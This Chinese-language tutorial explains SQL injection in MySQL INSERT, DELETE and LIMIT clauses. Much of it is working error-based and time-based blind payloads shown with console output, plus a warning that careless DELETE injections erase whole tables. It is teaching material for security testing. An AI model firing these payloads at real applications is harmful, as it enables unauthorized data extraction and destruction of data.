0x00 简介

介绍常见的注入和非常见的一些注入点的位置和语句

0x01 insert,delete,update

insert,delete,update 主要是用到盲注和报错注入,此类注入点不建议使用sqlmap等工具,会造成大量垃圾数据，和其他情况。

insert

可以看到假如没闭合是会产生很多垃圾数据的，所以这类注入建议手工或者自己写工具。

一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现。

  1. 报错

  1. mysql> insert into admin (id,username,password) values (2,"or updatexml(1,concat(0x7e,(version())),0) or","admin");
  2. Query OK, 1 row affected (0.00 sec)

  4. mysql> select * from admin;
  5. +------+-----------------------------------------------+----------+
  6. | id   | username                                      | password |
  7. +------+-----------------------------------------------+----------+
  8. |    1 | admin                                         | admin    |
  9. |    1 | and 1=1                                       | admin    |
  10. |    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
  11. +------+-----------------------------------------------+----------+
  12. 3 rows in set (0.00 sec)

  14. mysql> insert into admin (id,username,password) values (2,""or updatexml(1,concat(0x7e,(version())),0) or"","admin");
  15. ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'

  1. 盲注

int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等

  1. mysql> insert into admin values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',"admin");
  2. Query OK, 1 row affected (5.00 sec)

  4. mysql> insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',"admin");
  5. Query OK, 1 row affected (0.00 sec)

字符型注意闭合不能使用and

  1. mysql> insert into admin values (2,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',"admin");
  2. Query OK, 1 row affected (0.00 sec)

  4. mysql> insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',"admin");
  5. Query OK, 1 row affected (5.01 sec)

注意盲注产生大量垃圾数据。

delete

报错注入同上

值得注意的时delete 注入很危险，很危险，很危险。

语句不当 将会亲人泪两行 or1=1 因为 1=1 为true 所以每一行被删除了, 他以前用sqlmap一把梭 现在过的很好，每顿都有人送饭到手上。

所以在 delete注入时使用 or 一定要为false

  1. mysql> delete from admin where id =3 or 1=1;
  2. Query OK, 4 rows affected (0.00 sec)

报错注入

  1. mysql> delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);
  2. ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'

盲注

or 配上 if() 函数使用不当 再提下 if(expr1,expr2,expr3)，如果expr1的值为true，返回expr2的值，如果expr1的值为false， 返回expr3的值。

  1. mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),1);
  2. Query OK, 3 rows affected (0.00 sec)

所以 delete中 or 的正确使用方法 (or 右边要为false)

  1. mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),0);
  2. Query OK, 0 rows affected (0.00 sec)

  4. mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0);
  5. Query OK, 0 rows affected (5.00 sec)

  1. 时间盲注

时间盲注不能直接简单的 sleep() 因为他会对每条内容来执行你的语句，所以会造成dos测试获取速度慢等问题，这时候我们需要用到子查询

0x04 limit

这种注入也不是很常见，依照 https://rateip.com/blog/sql-injections-in-mysql-limit-clause/ 来提一下

  1. mysql> select * from admin where id >0 limit 0,1 $id

如何利用呢 大佬们已经给出方法了 用 PROCEDURE ANALYSE 配合报错注入,所以多看文档，如果你想提升下自己的水平

  1. mysql> select * from admin where id >0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
  2. ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'
  3. ERROR:
  4. No query specified

这里延时只能使用 BENCHMARK() 如同

  1. select * from admin where id >0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);
